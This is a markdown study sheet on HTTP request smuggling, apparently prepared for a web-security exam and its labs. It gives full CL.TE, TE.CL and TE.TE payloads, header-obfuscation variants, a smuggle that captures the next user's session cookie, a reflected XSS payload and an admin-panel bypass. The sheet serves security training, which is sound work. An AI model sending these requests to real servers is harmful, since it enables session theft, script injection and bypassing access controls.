# HTTP Request Smuggling - Stage 1

## 🎯 Overview

HTTP Request Smuggling exploits discrepancies in how front-end and back-end servers parse HTTP requests, particularly the `Content-Length` and `Transfer-Encoding` headers.

## 🔍 Types

### CL.TE (Content-Length → Transfer-Encoding)
- Front-end uses `Content-Length`
- Back-end uses `Transfer-Encoding`

### TE.CL (Transfer-Encoding → Content-Length)
- Front-end uses `Transfer-Encoding`
- Back-end uses `Content-Length`

### TE.TE (Transfer-Encoding → Transfer-Encoding)
- Both use `Transfer-Encoding`
- Exploit obfuscation techniques

## 🔥 Detection Payloads

### CL.TE Detection
```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
X: X
```

### TE.CL Detection
```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

## 📋 Lab Techniques

### Lab 1: CL.TE with GPOST
**Technique:** Use unsupported method to detect

```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

---

### Lab 2: TE.CL with GPOST
```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

---

### Lab 3: TE.TE Obfuscation
**Technique:** Obfuscate Transfer-Encoding header

```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

**Other obfuscation techniques:**
```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

---

### Lab 4: Steal Other User's Request (Cookie Theft)
**Technique:** Smuggle request that captures next user's request

```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 324
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=your-session

csrf=your-csrf-token&postId=1&name=hacker&email=hacker@evil.com&website=http://evil.com&comment=
```

The next user's request will be appended to your comment, including their session cookie.

---

### Lab 5: Reflected XSS via Request Smuggling
**Technique:** Smuggle XSS payload in User-Agent

```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=1 HTTP/1.1
User-Agent: "><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

---

### Lab 6: Bypass Front-End Security Controls
**Technique:** Access restricted admin panel

```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

## 🛠️ Tools

### HTTP Request Smuggler (Burp Extension)
**Essential tool for detecting and exploiting request smuggling**

**Usage:**
1. Install from BApp Store
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. Review results for CL.TE, TE.CL, or TE.TE vulnerabilities
4. Use "Launch attack" to exploit

## 🎓 Exam Tips

1. **Use HTTP Request Smuggler extension** - Automates detection
2. **Check feedback forms** - Common location for smuggling
3. **Try GPOST method** - Easy detection technique
4. **Be patient** - Smuggling requires precise timing
5. **Use Burp Repeater** - Manual control over requests
6. **Watch for time delays** - Indicator of successful smuggling

## 🔍 Common Bypasses

### Bypass 1: Obfuscated Transfer-Encoding
```http
Transfer-Encoding: chunked
Transfer-Encoding: cow
```

### Bypass 2: Space Before Header Name
```http
 Transfer-Encoding: chunked
```

### Bypass 3: Tab Instead of Space
```http
Transfer-Encoding:[tab]chunked
```

### Bypass 4: Newline in Header Value
```http
Transfer-Encoding
: chunked
```

## 📚 References

- [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [HTTP Request Smuggler Extension](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646)
- [Request Smuggling Cheat Sheet](https://portswigger.net/web-security/request-smuggling/cheat-sheet)
